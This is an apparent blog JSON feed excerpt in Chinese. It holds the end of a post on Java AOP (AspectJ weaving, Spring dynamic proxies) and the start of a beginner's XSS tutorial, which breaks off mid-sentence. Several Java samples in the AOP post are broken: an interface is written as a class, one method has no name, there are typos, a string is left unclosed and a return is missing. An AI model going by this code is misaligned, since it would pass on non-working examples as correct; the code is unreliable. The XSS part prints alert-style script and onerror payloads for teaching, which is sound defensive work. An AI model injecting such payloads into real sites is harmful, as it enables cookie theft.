class=\"token class-name\">AuthorizeAspect</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token annotation punctuation\">@Pointcut</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execution(@com.example.annotation.Authorize  * *..*.*(..))\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">pointCut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token annotation punctuation\">@Before</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pointCut()\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JoinPoint</span> joinPoint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizeException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token annotation punctuation\">@After</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pointCut()\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JoinPoint</span> joinPoint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizeException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>為了更好地瞭解 Compiler-Time AOP的行為，我用 AspectJ 的 AJC Compiler (這邊用的是 Compile time weaving ) 織入切面，編譯完 classfile 之後再用 <a href=\"https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javap.html\">javap</a> 反編譯回源碼之後如下。<br>\n可以看到 ajc 實作 AOP 的方式就是先幫標記的 Aspect 類別建立 aspectOf() 函式取得 Aspect 類別的 Singleton ，</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">AuthorizeAspect</span> <span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ajc$perSingletonInstance <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NoAspectBoundException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.example.application.aspect.AuthorizeAspect\"</span><span class=\"token punctuation\">,</span> ajc$initFailureCause<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span> ajc$perSingletonInstance<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>接著在標注對應 annotation 的函式中符合切面條件的位置之前或之後插入跳轉點並傳入織入點的相關訊息(類名、方法名、參數等）</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Authorize</span><br><span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">createNewUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> id<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InValidEmailException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// 用 Java reflection機制獲得 JoinPoint 的 Package, class, method name 等訊息，創造 JointPoint實例</span><br>    <span class=\"token class-name\">JoinPoint</span> var3 <span class=\"token operator\">=</span> <span class=\"token class-name\">Factory</span><span class=\"token punctuation\">.</span><span class=\"token function\">makeJP</span><span class=\"token punctuation\">(</span>ajc$tjp_1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">User</span> var7<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// 執行 Authorize 的 before aspect，並傳入 JointPoint 提供此函數的資訊與參數</span><br>        <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">before</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"some task\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        var7 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> var8<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// 若出現異常 依然執行 after aspect並拋出異常</span><br>        <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">after</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">throw</span> var8<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token comment\">// 執行 Authorize 的 after aspect</span><br>    <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">after</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> var7<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>從以上範例應該不難看出 Compile-Time AOP 的核心運作邏輯，也就是在 classfile 中根據某些 meta information (e.g. annotation) 生成對應的 aspect 函式，並且在合格的切入點處插入跳轉點的函式。</p>\n<p>基本上 Compile-Time AOP 最明顯的好處就是在於延遲低，執行期不需要知道任何 meta information，也不需要用到 <a href=\"https://www.oracle.com/technical-resources/articles/java/javareflection.html\">reflection</a> 機制，被織入的 code 看起來就像是原生的 code 一樣，只是幫你省掉了自己重複撰寫的麻煩。</p>\n<h4 id=\"run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\">#</a> Run-Time AOP — Spring AOP 中的策略</h4>\n<p>相較於 Compile-Time AOP 中主要是藉由「織入」來完成 AOP， Run-Time AOP 希望能讓一切的相關操作都發生在執行期 (就像動態語言中的 AOP 實現那樣)。目前最主流的做法是所謂的 “Proxy-based AOP” ，以 Java 為例，便是運用 reflection API 中的 Proxy 函式庫。 再具體地細分，還可以分成靜態代理與動態代理兩種模式。</p>\n<ul>\n<li>靜態代理 ( Static-Proxy)<br>\n一句話概括說明靜態代理就是：用一個 Aspect Proxy 實現 “ Decorator Pattern ” 。所有需要被 Aspect 切入的函式都必須以介面的形式定義。 AspectProxy 類別則也需要實作此介面，把要被切入的介面的實例保存起來( target )。在呼叫 target 的介面方法時， 讓 proxy 先(或之後)去執行切面方法。</li>\n</ul>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IFetchData</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FetchData</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">{</span><br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"取得資料\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AuthorizeProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">{</span><br>  <br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IFetchData</span> target<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuthorizeProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IFetchData</span> target<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>target <span class=\"token operator\">=</span> target<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"執行before Aspect\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        target<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"執行after Aspect\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>相信大家應該不難看出來，用靜態代理實現 AOP 非常之麻煩，有任何可能會需要被代理的地方都必須宣告成介面，同時 Aspect Proxy 也必須針對所有可能需要被代理的介面都撰寫重複的切面邏輯。在實務上這麼做其實不太實際。</p>\n<ul>\n<li>動態代理 ( Dynamic Proxy )<br>\n另一種 Run-Time AOP ，同時也是 包含 Spring AOP 等套件所使用的主流方式是動態代理。這種作法的基礎是來自於 Java 原生包含的 reflection API。 reflection API 是一套可以向 JVM 詢問、修改 class 和其方法與屬性的機制。<br>\n至於為什麼用 reflection 我們就可以實現 AOP，先讓我們參考以下這個範例：</li>\n</ul>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>dynamicproxy</span><br><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span> <br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AuthorizeProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">InvocationHandler</span> <span class=\"token punctuation\">{</span> <br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Object</span> delegate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">AuthorizeService</span> authorizeService<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> target<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <br>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>target <span class=\"token operator\">=</span> target<span class=\"token punctuation\">;</span> <br>        <span class=\"token comment\">// 向 reflection.Proxy 註冊 target 的類別並提供 Handler（此例中為this)，並回傳 proxy 實例， </span><br>        <span class=\"token comment\">// proxy 藉由 reflection API，可以構造出一個跟 target 具有一樣 method 和 field 的全新類別</span><br>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span> <br>                           target<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <br>                           target<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <br>                           <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token punctuation\">}</span> <br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> proxy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Method</span> method<span class=\"token punctuation\">,</span> <br>                         <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizedException</span> <span class=\"token punctuation\">{</span> <br>        <span class=\"token comment\">// Aspect 真正的邏輯就在這邊執行</span><br>        <span class=\"token class-name\"><span class=\"token namespace\">authorizeService<span class=\"token punctuation\">.</span></span>Authorize</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        result <span class=\"token operator\">=</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>tagret<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>\"如果要做什麼 clean up 可以在這邊做<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span> <br>    <span class=\"token punctuation\">}</span> <br> <br><span class=\"token punctuation\">}</span></code></pre>\n<p>我們可以藉由一個 bind 函式，向 reflection.Proxy 註冊 target 的類別並提供 Handler（此例中為this)，並回傳 proxy 實例。</p>\n<p>Proxy 藉由 reflection API，可以建構出一個跟 target 具有一樣 method 和 field 的全新類別，但因為我們實現了 InovocationHandler 介面，因此 proxy 在建構這個幾乎一樣的類別時，會在 target 的方法被呼叫時改成呼叫 invoke 方法[5]，因此如果要實現 AOP ，我們就只要修改 invoke 函式加上需要的 aspects 就行了。</p>\n<p>需要注意的是，我們使用了基於 reflection API 動態創造出來的 class ，除了 會有 JVM 中 class loader 的 overhead 以外，這個 class 的 method 被呼叫時都會需要通過許多額外的檢查，讓許多 JVM 的執行期優化策略失效[6]，所以本質上這種作法在速度上會有明顯的劣勢。</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>dynamicproxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DataFetcherDemo</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">DemoFetchData</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">AuthorizeProxy</span> proxy  <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AuthorizeProxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>        <br>        <span class=\"token class-name\">IFetchData</span> fetchData <span class=\"token operator\">=</span> <br>                <span class=\"token punctuation\">(</span><span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">)</span> proxy<span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FetchData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <br>        <span class=\"token keyword\">return</span> fetchData<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這種「動態代理」的方式正是 Spring 框架中的 Spring AOP 所使用的策略。根據 Spring AOP 的<a href=\"https://docs.spring.io/spring-framework/docs/2.5.x/reference/aop.html\">官方 document</a> ，在使用方面幾乎是跟 AspectJ 大同小異，卻可以省去建置專案時需要額外的插件來織入 aspects 的麻煩。</p>\n<p>但因為 Proxy 的管理是由 Spring 容器來執行，所以限制自然就是只有被 Spring 管理的 beans 可以被代理。</p>\n<p>基於動態代理來做 AOP 的話，務必要搞清楚 Proxy 的行為。在同一個類別中呼叫類別內其他函式的話，是沒有辦法被 Proxy 攔截的。考慮一個我們將 FooBoo 類別用 FooBooProxy 進行代理並呼叫其中的 boo 函式的狀況：</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__LCqsIhQ__1KGPazjA85zDZQ.png\" alt=\"\"></p>\n<p>另外值得一提的一點是， Java 中實現動態代理除了使用原生的 Proxy 以外，亦可以使用如 <a href=\"https://github.com/cglib/cglib\">cglib</a> 等 bytecode generation 函式庫，可以做到讓 Proxy 繼承 target 類別就能完成動態代理，而不需要讓所有需要 AOP 的類別都實作特定介面 [7] 。</p>\n<h4 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h4>\n<p>AOP 切分關注點的核心思想在不同生態系中都有不同的實現方式。</p>\n<p>如果是在 Java 這種有眾多 AOP 不同實現的工具存在的語言，也要注意就算使用方式看起來幾乎一模一樣（看看 AspectJ 和 Spring AOP 的語法那驚人的相似度），背後執行的原理導致的適用情境、執行效率等等的差別所帶來的影響。</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__FzyYBeQHVhaDG7Ln9Fif__A.png\" alt=\"\"></p>\n<p>— — -</p>\n<p>最後稍微介紹一下敝團隊。我們是隸屬於 OneDegree 集團底下的 Cymetrics 部門，此部門主要負責集團中資安產品的開發，團隊文化鼓勵工程師鑽研和分享技術原理。</p>\n<p>目前團隊有經營一個技術 Blog <a href=\"https://medium.com/cymetrics\">https://medium.com/cymetrics</a> <br>\n用來分享團隊成員們在工作中遇到或者自己想鑽研的主題。</p>\n<h4 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h4>\n<p>[1]<a href=\"https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction\">https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction</a><br>\n[2]<a href=\"https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern\">https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern</a><br>\n[3]<a href=\"https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26\">https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26</a><br>\n[4]<a href=\"https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html\">https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html</a><br>\n[5]<a href=\"https://www.itread01.com/content/1547764384.html\">https://www.itread01.com/content/1547764384.html</a><br>\n[6]<a href=\"https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/\">https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/</a><br>\n[7]<a href=\"https://www.cnblogs.com/carpenterlee/p/8241042.html\">https://www.cnblogs.com/carpenterlee/p/8241042.html</a></p>\n",
      "date_published": "2021-05-27T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/",
      "title": "零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>你＝<strong>User</strong> 陌生人＝<strong>Hacker</strong> 菜單＝<strong>Request</strong> 桌號＝<strong>cookie</strong> 老闆＝<strong>web server</strong></p>\n<p>想像你到一家餐廳吃飯，陌生人在有你桌號的菜單備註寫上無敵大辣，接著你沒有發現便直接把菜單送給老闆，然後老闆就送來了一份加了無敵大辣的餐點 ，這就是 XSS 的基礎概念。</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> 釋例</h2>\n<p>以前言的範例來做說明，當網頁在進行 browser render <strong>註1</strong>的時候（老闆收到菜單開始做菜），使用者<strong>輸入的欄位</strong>或是<strong>沒有被驗證的參數</strong>就被嵌入在網頁的程式碼（菜單）裡面，如果這段輸入包含惡意程式（被備註無敵大辣）就會導致使用者瀏覽這個頁面的時候觸發這段惡意程式，導致 XSS 風險的發生。</p>\n<h2 id=\"xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> XSS攻擊流程</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p1.png\" alt=\"\"></p>\n<ol>\n<li>Hacker 在受害網站注入 XSS 漏洞</li>\n<li>透過社交工程手法傳送惡意 URL 給 User</li>\n<li>當 User 點擊 URL 便會把自己的資料（cookie）藉由受害網站傳回給 Hacker</li>\n</ol>\n<h2 id=\"xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E\"><a class=\"direct-link\" href=\"#xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E\">#</a> XSS三大種類</h2>\n<h3 id=\"%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89\"><a class=\"direct-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89\">#</a> 反射型 XSS （Reflected）</h3>\n<ul>\n<li>最常見的 XSS 攻擊類型，通常是將惡意程式會藏在網址列裡，放在 GET 參數傳遞，範例如下：</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">http://www.example.com/upload.asp?id=&lt;script>alert(1);&lt;/script></code></pre>\n<ul>\n<li>這種手法要能夠成功攻擊，需要使用社交工程釣魚的技巧，使 User 點擊URL 攻擊才會生效。</li>\n<li>因為 URL 通常看起來很詭異，所以 Hacker 通常會使用短網址或 HTML Encoder 註2的方式嘗試欺騙 User。</li>\n</ul>\n<h3 id=\"dom-%E5%9E%8B-xss\"><a class=\"direct-link\" href=\"#dom-%E5%9E%8B-xss\">#</a> DOM 型 XSS</h3>\n<ul>\n<li>這種手法和反射型 XSS一樣，都需要使用社交工程釣魚的技巧，使 User 點擊 URL 攻擊才會生效。</li>\n<li>Hacker 在 URL 輸入 DOM <strong>註3</strong> 物件，把物件嵌入網頁程式碼，範例：</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;img src=# onerror=”alert(123)”></code></pre>\n<h3 id=\"%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)\"><a class=\"direct-link\" href=\"#%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)\">#</a> 儲存型 XSS ( Stored )</h3>\n<ul>\n<li>與前兩種手法不同的是此種攻擊手法不需要使用社交工程釣魚的技巧，也能使 User 受到攻擊</li>\n<li>攻擊的方式是 Hacker 將 Javascript 儲存在伺服器的資料庫中，進而引起使 User 遭受攻擊。</li>\n<li>最常見的例子就是將 Javascript 注入留言板，當下一位 User 瀏覽網頁時，網頁會載入留言板的 Javascript 進而使 User 受到攻擊，範例如下：</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">我是壞人！ &lt;script>alert(1);&lt;/script></code></pre>\n<p>然後當 User 瀏覽網頁的時候，就會因為網頁先載入了當下頁面的惡意程式，於是 User 的頁面就會跳出一個 1 的 alert，以此類推， Hacker 在這裡如果輸入讓 User 傳送 cookie 或是其他惡意程式行為，網頁也會完全照做！</p>\n<p><strong>執得一提的是，在三種XSS攻擊中，DOM 型 XSS 和另外兩種 XSS 的區別是 DOM 型 XSS 攻擊中，提取和執行惡意程式都是由 Browser 端完成，屬於前端 JavaScript 的安全漏洞，而其他兩種 XSS 都是因為伺服器而產生的安全風險。</strong></p>\n<h2 id=\"%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\">#</a> 駭客實際利用XSS漏洞案例</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ithome.com.tw/news/139205\">https://www.ithome.com.tw/news/139205</a></strong></p>\n<p>與上期一樣的實際案例，以這個風險來做一個接續的說明，這個風險除了 CSRF 以外，也有儲存型 XSS 的風險，會允許駭客將惡意程式貼到討論區中，而當 User 以瀏覽器造訪頁面時，網頁便會在背景執行程式，卻看不到程式碼。</p>\n<p>上期的 CSRF 就是預設主辦單位中了此類型的儲存型 XSS 的風險後，被 XSS 中的惡意程式竊取了權限，進而導致了 CSRF 的風險，使 Hacker 能夠以主辦單位的權限執行操作。</p>\n<h2 id=\"%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87\">#</a> 防範XSS的準則</h2>\n<ol>\n<li>\n<p>做好欄位輸入的驗證與檢查，不論是前後端都應假設輸入是惡意且不可信任的，例如：URL、檔案上傳、表單欄位、留言板等。</p>\n</li>\n<li>\n<p>文法與語意：應確認每個網頁表單輸入欄位是否為合理的資料類型與內容，例如：年齡的欄位在文法上應只接受0–9的數字，而語意上應確認此數字介於 